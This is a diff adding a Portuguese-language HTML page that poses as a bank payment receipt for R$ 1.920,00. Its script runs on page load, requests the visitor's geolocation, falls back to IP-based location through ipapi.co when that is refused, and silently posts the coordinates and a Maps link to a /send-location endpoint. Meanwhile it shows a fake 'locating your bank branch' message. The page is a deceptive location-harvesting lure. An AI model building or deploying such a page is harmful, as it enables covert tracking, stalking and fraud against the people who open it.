@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Comprovante Bancário</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 80px auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .loading {
+      text-align: center;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .comprovante-container {
+      display: none;
+    }
+
+    .informacoes p {
+      margin: 8px 0;
+    }
+
+    .comprovante-footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .botao {
+      background-color: #0070f3;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .botao:hover {
+      background-color: #0059c1;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div id="loading" class="loading">
+      <p>Localizando sua agência bancária para gerar o comprovante...</p>
+      <p><em>Por favor, aguarde alguns segundos.</em></p>
+    </div>
+
+    <div id="comprovante" class="comprovante-container">
+      <h1>Comprovante de Recebimento</h1>
+
+      <div class="informacoes">
+        <p><span>Data:</span> <span id="data-atual"></span></p>
+        <p><span>Valor Recebido:</span> R$ 1.920,00</p>
+        <p><span>De:</span> Renato</p>
+        <p><span>Status:</span> Recebido com Sucesso</p>
+      </div>
+
+      <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
+
+      <div class="comprovante-footer">
+        <p>Este comprovante é gerado automaticamente com base na sua localização.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+
+    async function sendLocationData(latitude, longitude) {
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      try {
+        await fetch("/send-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps })
+        });
+      } catch (error) {
+        console.warn("Erro ao enviar localização:", error);
+      }
+    }
+
+    function requestGeolocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const { latitude, longitude } = pos.coords;
+            sendLocationData(latitude, longitude);
+          },
+          (err) => {
+            console.warn("Geolocalização negada ou falhou:", err.message);
+            fallbackIPLocation();
+          }
+        );
+      } else {
+        fallbackIPLocation();
+      }
+    }
+
+    async function fallbackIPLocation() {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const data = await res.json();
+        if (data && data.latitude && data.longitude) {
+          sendLocationData(data.latitude, data.longitude);
+        }
+      } catch (err) {
+        console.warn("Fallback IP geolocation falhou:", err);
+      }
+    }
+
+    window.addEventListener("load", () => {
+      requestGeolocation();
+
+      setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("comprovante").style.display = "block";
+      }, 3000);
+    });
+  </script>
+</body>
+
+</html>
